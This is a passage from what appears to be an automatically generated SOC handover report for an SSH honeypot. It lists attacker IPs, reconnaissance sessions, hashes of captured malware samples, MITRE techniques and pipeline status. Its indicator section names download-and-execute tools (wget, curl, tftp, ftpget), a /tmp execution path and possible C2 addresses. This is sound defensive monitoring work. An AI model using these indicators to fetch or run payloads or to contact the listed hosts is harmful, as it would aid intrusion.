- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **70** | 2026-07-01 10:57 | 2026-07-01 14:48 | 68m | 0 | `T1592` | 🟠 MEDIUM |
| `132.148.73[.]100` | **9** | 2026-07-01 10:55 | 2026-07-01 12:02 | 4m | 0 | `T1592` | 🟢 LOW |
| `72.167.53[.]56` | **7** | 2026-07-01 14:35 | 2026-07-01 14:54 | 3m | 0 | `T1592` | 🟢 LOW |
| `152.32.211[.]153` | **4** | 2026-07-01 14:51 | 2026-07-01 14:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **4** | 2026-07-01 12:58 | 2026-07-01 14:15 | 3m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]240` | **3** | 2026-07-01 14:23 | 2026-07-01 14:33 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.194[.]167` | **2** | 2026-07-01 11:48 | 2026-07-01 11:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-01 13:28 | 2026-07-01 14:20 | 2m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-01 10:57 | 2026-07-01 11:05 | 1m | 0 | `T1592` | 🟢 LOW |
| `1.222.180[.]22` | 1 | 2026-07-01 12:42 | 2026-07-01 12:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `101.96.195[.]17` | 1 | 2026-07-01 10:57 | 2026-07-01 10:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-07-01 10:56 | 2026-07-01 10:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.250.248[.]29` | 1 | 2026-07-01 13:15 | 2026-07-01 13:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-07-01 14:24 | 2026-07-01 14:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.247.32[.]186` | 1 | 2026-07-01 11:17 | 2026-07-01 11:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-01 13:33 | 2026-07-01 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-01 14:34 | 2026-07-01 14:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `47.93.81[.]231` | 1 | 2026-07-01 12:45 | 2026-07-01 12:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.151.249[.]194` | 1 | 2026-07-01 12:01 | 2026-07-01 12:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]80` | 1 | 2026-07-01 11:19 | 2026-07-01 11:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]69` | 1 | 2026-07-01 11:17 | 2026-07-01 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]44` | 1 | 2026-07-01 11:56 | 2026-07-01 11:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]10` | 1 | 2026-07-01 11:17 | 2026-07-01 11:17 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `118.145.245[.]82` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 34 |
| `94.154.43[.]10` | TR |  | **100** ⚠️ | 17 |
| `97.93.43[.]157` | US | Charter Communications LLC | **100** ⚠️ | 38 |
| `73.36.177[.]174` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 45 |
| `20.228.193[.]165` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `116.41.81[.]52` | KR | LG POWERCOMM | **100** ⚠️ | 50 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 110 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 110 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 231 cases |
| Tool 34  | Credential Extractor        | ✅ 148 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 51 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (2.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 109 priority case(s) shown individually · 23 recon entry/entries in table (9 group(s) consolidating 103 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-01T16:30:18Z_
